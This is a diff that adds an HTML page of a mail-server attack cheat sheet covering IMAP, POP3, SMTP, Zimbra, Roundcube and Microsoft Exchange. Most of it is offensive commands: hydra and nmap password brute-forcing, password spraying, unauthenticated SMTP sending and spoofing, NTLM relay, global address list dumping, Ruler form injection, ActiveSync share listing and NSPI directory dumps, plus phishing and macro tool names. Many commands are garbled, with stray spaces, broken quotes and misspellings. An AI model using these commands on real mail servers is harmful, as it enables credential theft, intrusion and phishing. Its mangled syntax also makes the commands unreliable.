@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Mail-Server-Attacks-Cheat-Sheet - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Mail-Server-Attacks-Cheat-Sheet", url: "#_top", children: [
+              {title: "IMAP", url: "#imap" },
+          ]},
+          {title: "* NTLM Auth", url: "#ntlm-auth", children: [
+          ]},
+          {title: "* Bruteforce", url: "#bruteforce", children: [
+              {title: "POP3", url: "#pop3" },
+          ]},
+          {title: "* NTLM Auth", url: "#ntlm-auth_1", children: [
+          ]},
+          {title: "* Bruteforce", url: "#bruteforce_1", children: [
+              {title: "SMTP", url: "#smtp" },
+          ]},
+          {title: "* NTLM Auth", url: "#ntlm-auth_2", children: [
+          ]},
+          {title: "* Bruteforce", url: "#bruteforce_2", children: [
+          ]},
+          {title: "* Spoofing", url: "#spoofing", children: [
+          ]},
+          {title: "* Non Auth", url: "#non-auth", children: [
+              {title: "Zimbra", url: "#zimbra" },
+          ]},
+          {title: "* Misconfiguration", url: "#misconfiguration", children: [
+          ]},
+          {title: "* Anti-Malware", url: "#anti-malware", children: [
+          ]},
+          {title: "* ActiveSync(LDAP)", url: "#activesyncldap", children: [
+          ]},
+          {title: "* ActiveSync(SMB Share)", url: "#activesyncsmb-share", children: [
+          ]},
+          {title: "* Phishing", url: "#phishing", children: [
+          ]},
+          {title: "* Known Vuln", url: "#known-vuln", children: [
+          ]},
+          {title: "* Spray", url: "#spray", children: [
+              {title: "Roundcube", url: "#roundcube" },
+          ]},
+          {title: "* Anti-Malware", url: "#anti-malware_1", children: [
+          ]},
+          {title: "* ActiveSync(LDAP)", url: "#activesyncldap_1", children: [
+          ]},
+          {title: "* ActiveSync(SMB Share)", url: "#activesyncsmb-share_1", children: [
+          ]},
+          {title: "* Phishing", url: "#phishing_1", children: [
+          ]},
+          {title: "* Known Vuln", url: "#known-vuln_1", children: [
+          ]},
+          {title: "* Spray", url: "#spray_1", children: [
+              {title: "Microsoft Exchange", url: "#microsoft-exchange" },
+          ]},
+          {title: "* AutotDiscover", url: "#autotdiscover", children: [
+          ]},
+          {title: "* Known Vuln", url: "#known-vuln_2", children: [
+          ]},
+          {title: "* Spray", url: "#spray_2", children: [
+          ]},
+          {title: "* NTLM Auth", url: "#ntlm-auth_3", children: [
+          ]},
+          {title: "* NTLMRelay", url: "#ntlmrelay", children: [
+          ]},
+          {title: "* GAL", url: "#gal", children: [
+          ]},
+          {title: "* Exchange Admin Group Deligation", url: "#exchange-admin-group-deligation", children: [
+          ]},
+          {title: "* Rule", url: "#rule", children: [
+          ]},
+          {title: "* Forms", url: "#forms", children: [
+          ]},
+          {title: "* Anti-Malware", url: "#anti-malware_2", children: [
+          ]},
+          {title: "* ActiveSync(LDAP)", url: "#activesyncldap_2", children: [
+          ]},
+          {title: "* ActiveSync(SMB Share)", url: "#activesyncsmb-share_2", children: [
+          ]},
+          {title: "* ActiveSync(WSS)", url: "#activesyncwss", children: [
+          ]},
+          {title: "* RPC", url: "#rpc", children: [
+          ]},
+          {title: "* LDAP", url: "#ldap", children: [
+          ]},
+          {title: "* Phishing", url: "#phishing_2", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="mail-server-attacks-cheat-sheet">Mail-Server-Attacks-Cheat-Sheet</h1>
+<p>A cheat sheet that contains common enumeration and attack methods for Mail Server.</p>
+<p><img alt="Mail Attacks" src="https://github.com/HadessCS/Mail-Server-Attacks-Cheat-Sheet/blob/main/mailattacks_cover.png" /></p>
+<p>Brought to you by:</p>
+<p><img src="https://hadess.io/wp-content/uploads/2022/04/LOGOTYPE-tag-white-.png" alt="HADESS" width="200"/></p>
+<p><a href="https://hadess.io">HADESS</a> performs offensive cybersecurity services through infrastructures and software that include vulnerability analysis, scenario attack planning, and implementation of custom integrated preventive projects. We organized our activities around the prevention of corporate, industrial, and laboratory cyber threats.</p>
+<h2 id="imap">IMAP</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>  nmap [-sS] [-sC] -Pn -p 143,993 -sV --script=banner [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>  nc -nv &lt;IP&gt; 993 [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>  shodan search &quot;port:143&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="ntlm-auth">* NTLM Auth</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>   telnet example.com 143
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>   a1 AUTHENTICATE NTLM 
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>   nmap --script=imap-ntlm-info [IP]
+</span></code></pre></div>
+<h1 id="bruteforce">* Bruteforce</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>   hydra -l USERNAME -P passwords. -f [IP] imap -V
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>   hydra -S -v -l USERNAME -P passwords. -s 993 -f [IP] imap -V
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>   nmap -sV --script imap-brute -p [PORT] [IP]
+</span></code></pre></div>
+<h2 id="pop3">POP3</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>  nmap [-sS] [-sC] -Pn -p 110,995 -sV --script=banner [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>  nc -nv &lt;IP&gt; 110 [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>  shodan search &quot;port:995&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="ntlm-auth_1">* NTLM Auth</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>   nmap --script &quot;pop3-capabilities or pop3-ntlm-info&quot; -sV -port [PORT] [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>   a1 AUTHENTICATE NTLM 
+</span></code></pre></div>
+<h1 id="bruteforce_1">* Bruteforce</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>   nmap -p110 --script pop3-brute &lt;target&gt;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>   hydra -l muts -P pass. [IP] pop3
+</span></code></pre></div>
+<h2 id="smtp">SMTP</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>  nmap [-sS] [-sC] -Pn -p 25,465,587 -sV --script=banner or --script smtp-commands [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>  nc -nv &lt;IP&gt; 25 [IP]
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>nc -nv &lt;IP&gt; 465 [IP]
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>nc -nv &lt;IP&gt; 587 [IP]
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>  shodan search &quot;port:25&quot;
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>shodan search &quot;port:465&quot;
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>shodan search &quot;port:587&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="ntlm-auth_2">* NTLM Auth</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>telnet example.com 587 
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>HELO
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>AUTH NTLM 334 
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>   a1 AUTHENTICATE NTLM 
+</span></code></pre></div>
+<h1 id="bruteforce_2">* Bruteforce</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>   nmap -p[25,465,587] --script smtp-brute &lt;target&gt;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>   hydra -l muts -P pass. [IP] smtp
+</span></code></pre></div>
+<h1 id="spoofing">* Spoofing</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>   emkei.cz
+</span></code></pre></div>
+<h1 id="non-auth">* Non Auth</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>telnet [IP] [25 or 465 or 587]
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>MAIL FROM: sender@adress.ext
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>RCPT TO: recipient@adress.ext
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>SUBJECT: Test message
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>.
+</span></code></pre></div>
+<h2 id="zimbra">Zimbra</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>  shodan search &quot;8.8.6_GA_1906&quot;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>  shodan search &quot;zimbra&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="misconfiguration">* Misconfiguration</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>   modules/auxiliary/gather/memcached_extractor
+</span></code></pre></div>
+<h1 id="anti-malware">* Anti-Malware</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>evilmacro
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>macropack
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>...
+</span></code></pre></div>
+<h1 id="activesyncldap">* ActiveSync(LDAP)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>   LDAPPER. py -D EVIL -U &#39;Administrator&#39; -P ‘password’ -S DC02.EVIL.DEV
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>&#39; (msExchDeviceID=123456)
+</span></code></pre></div>
+<h1 id="activesyncsmb-share">* ActiveSync(SMB Share)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>   peas - u &#39; EVIL.DEV\sh&#39; -p &#39;[password]&#39; mail.evil.dev --list-unc&#39;\\DC01\&#39;
+</span></code></pre></div>
+<h1 id="phishing">* Phishing</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>   gophish
+</span></code></pre></div>
+<h1 id="known-vuln">* Known Vuln</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>CVE‑2022‑37042
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>CVE‑2022‑37041
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>CVE‑2022‑37044
+</span></code></pre></div>
+<h1 id="spray">* Spray</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>   POST
+</span></code></pre></div>
+<h2 id="roundcube">Roundcube</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>  shodan search &quot;http.title:&#39;Roundcube Webmail :: Welcome to Roundcube Webmail&#39;&quot;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>  shodan search &quot;http.favicon.hash:976235259&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="anti-malware_1">* Anti-Malware</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>evilmacro
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>macropack
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>...
+</span></code></pre></div>
+<h1 id="activesyncldap_1">* ActiveSync(LDAP)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>   LDAPPER. py -D EVIL -U &#39;Administrator&#39; -P ‘password’ -S DC02.EVIL.DEV
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>&#39; (msExchDeviceID=123456)
+</span></code></pre></div>
+<h1 id="activesyncsmb-share_1">* ActiveSync(SMB Share)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>   peas - u &#39; EVIL.DEV\sh&#39; -p &#39;[password]&#39; mail.evil.dev --list-unc&#39;\\DC01\&#39;
+</span></code></pre></div>
+<h1 id="phishing_1">* Phishing</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>   gophish
+</span></code></pre></div>
+<h1 id="known-vuln_1">* Known Vuln</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>   2021-44026
+</span></code></pre></div>
+<h1 id="spray_1">* Spray</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>   POST
+</span></code></pre></div>
+<h2 id="microsoft-exchange">Microsoft Exchange</h2>
+<ul>
+<li>Information Gathering</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>shodan search &quot;&#39;X-AspNet-Version http.title:&#39;Outlook&#39; –&#39;x-owa-version&#39;&quot;
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>shodan search &quot;http.favicon.hash:44274939&quot;
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>shodan search &quot;http.title:outlook exchange&quot;
+</span></code></pre></div>
+<ul>
+<li>Attacks</li>
+</ul>
+<h1 id="autotdiscover">* AutotDiscover</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>   autodiscover/autodiscover.xml
+</span></code></pre></div>
+<h1 id="known-vuln_2">* Known Vuln</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>ProxyLogon(2021-26855)
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>ProxyShell(2021-34473)
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>HAFNIUM(2021-26858)
+</span></code></pre></div>
+<h1 id="spray_2">* Spray</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Invoke-PasswordSprayOWA
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Invoke-PasswordSprayEWS
+</span></code></pre></div>
+<h1 id="ntlm-auth_3">* NTLM Auth</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>   nmap --script http-ntlm-info
+</span></code></pre></div>
+<h1 id="ntlmrelay">* NTLMRelay</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>reponder
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>./exchangeRelayx.py -t https://mail.evil.com
+</span></code></pre></div>
+<h1 id="gal">* GAL</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>Get-GlobalAddressList -ExchHostname mail.domain.com -UserName
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>domain\username -Password password -OutFile global-address-list.
+</span></code></pre></div>
+<h1 id="exchange-admin-group-deligation">* Exchange Admin Group Deligation</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>Bloodhound
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>net
+</span></code></pre></div>
+<h1 id="rule">* Rule</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>   GUI
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>   Ruler
+</span></code></pre></div>
+<h1 id="forms">* Forms</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>   ./ruler --email user@evil.dev form add --suffix superduper --input command. --send
+</span></code></pre></div>
+<h1 id="anti-malware_2">* Anti-Malware</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>evilmacro
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>macropack
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>...
+</span></code></pre></div>
+<h1 id="activesyncldap_2">* ActiveSync(LDAP)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>   LDAPPER. py -D EVIL -U &#39;Administrator&#39; -P ‘password’ -S DC02.EVIL.DEV
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>&#39; (msExchDeviceID=123456)
+</span></code></pre></div>
+<h1 id="activesyncsmb-share_2">* ActiveSync(SMB Share)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>   peas - u &#39; EVIL.DEV\sh&#39; -p &#39;[password]&#39; mail.evil.dev --list-unc&#39;\\DC01\&#39;
+</span></code></pre></div>
+<h1 id="activesyncwss">* ActiveSync(WSS)</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>   peas -U &#39; EVIL.DEC\user’ -p ‘password’ exch01.evil.dev - -smb-user=‘EVIL\sharepoint-setup&#39;
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>• - smb-pass=&#39; password’ •-list-unc &#39;http://SHP01/share’
+</span></code></pre></div>
+<h1 id="rpc">* RPC</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>   nmap mail.evil.dev -p 6001 -sV - sC
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a> rpcmap . py -debug -auth-transport’EVIL/user:password’
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>&#39;ncacn http: /6001,RpcProxy=mail.evil.dev: 443]&#39;
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a> rpcmap.py -debug -auth-transport &#39;EVIL/user:password&#39; -auth-rpc &#39;EVIL/mia:password&#39; -auth-level 6 -brute-opnums &#39;ncacn_http:[6001,RpcProxy=mail.evil.dev:443]&#39;
+</span></code></pre></div>
+<h1 id="ldap">* LDAP</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a> LDAPPER. py -D EVIL - U &#39;Administrator&#39; -P ‘password’ -S DC01. EVIL.DEV
+</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>(mail=user@evil.dev) mail objectGUID legacyExchangeDN distinguishedName
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>exchanger. py EVIL/user: ‘password’@mail.evil.dev nspi
+</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>dump -tables -name Hackers -lookup-tvpe EXTENDED
+</span></code></pre></div>
+<h1 id="phishing_2">* Phishing</h1>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>   gophish
+</span></code></pre></div>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cloud/mail-server-attacks.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
